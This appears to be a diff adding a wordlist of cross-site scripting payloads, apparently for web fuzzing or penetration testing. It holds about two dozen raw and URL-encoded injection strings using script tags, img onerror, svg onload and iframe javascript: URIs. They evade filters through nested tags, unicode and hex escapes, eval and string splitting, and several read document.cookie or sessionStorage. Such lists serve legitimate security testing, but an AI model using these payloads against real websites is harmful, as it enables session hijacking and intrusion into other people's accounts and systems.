@@ -1,0 +1,27 @@
+%22%3E%3Csvg+onload%3Dalert%281%29%3E&
+%3Cimg+src%3Dasdf+onerror%3Dalert%28JSON.stringify%28sessionStorage%29%29%3E&
+<script>alert('6712110210111410111697')</script>
+<scr<script>ipt>alert('6712110210111410111697')</scr<script>ipt>
+%3Cimg+src%2Fonerror%3Dalert%281%29%3E&
+"><script>alert('6712110210111410111697')</script>
+%3Cimg+src%2Fonerror%3Dalert%281%29%3E&
+%3Csvg%3E%3Cimage+href%3D1+onerror%3Dalert%281%29%3E%09&
+"><script>alert(6712110210111410111697)</script>
+<script>\u0061lert(6712110210111410111697)</script>
+<script>eval('\x61lert(6712110210111410111697)')</script>
+%3Cimg+onerror%3Deval%28%27al%26%23x5c%3Bu0065rt%281%29%27%29+src%3Da%3E&
+%3Cvideo+onloadstart%3Dalert%28%29%3E%3Csource%3E%3C%2F*%3E&
+%22%3C%21--%3E%3CSvg+OnLoad%3Dconfirm%3F.%28%2Fd3rk%F0%9F%98%88%2F%29%3C%21--1%22%29%22%3C%21--%3E%3CSvg%2BOnLoad%3Dconfirm%3F.%28%2Fd3rk%F0%9F%98%88%2F%29%3C%21--&
+<img src=x onerror=alert('6712110210111410111697');>
+<img src=x onerror=alert('6712110210111410111697')//
+%3CSvg+On+Only%3D1+Onload%3Dalert%281%29%3E&
+<img src=x onerror=alert(6712110210111410111697);>
+<img src=x oneonerrorrror=alert(6712110210111410111697);>
+%3CIFRAME+SRC%3D%22javascript%3Aalert%28document.cookie%29%3B%22%3E%3C%2FIFRAME%3E&
+%22%3E%3Ca%3Ea%3C%2Fa%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E%7B%7B9-9%7D%7D%27%3Balert%280%29%3B%3A%2F%2F&
+%3Cimg%2Fsrc%2Fonerror%3D%22%28function%28x%29%7Bthis%5Bx%2B%60ert%60%5D%281%29%7D%29%60al%60%22%3E&
+%3Cimg%2Fsrc%2Fonerror%3D%22this.ownerDocument.defaultView%5B%27%5Cu0061lert%27%5D%284%29%22%3E&
+10%3C%2Foption%3E%3C%2Fselect%3E%3Cimg%2Fsrc%3Dxon%3D%28%29onx%2Bhonerror%3Dalert%281%29%3Ess%3Csvg%2Fonload%3Dprompt%28document.domain%29%2520%3E&
+%3Cimg+src%3Dx+onerror%3D%22eval%28%27%5Cx61lert%281%29%27%29%22%2F%3E&
+'
+
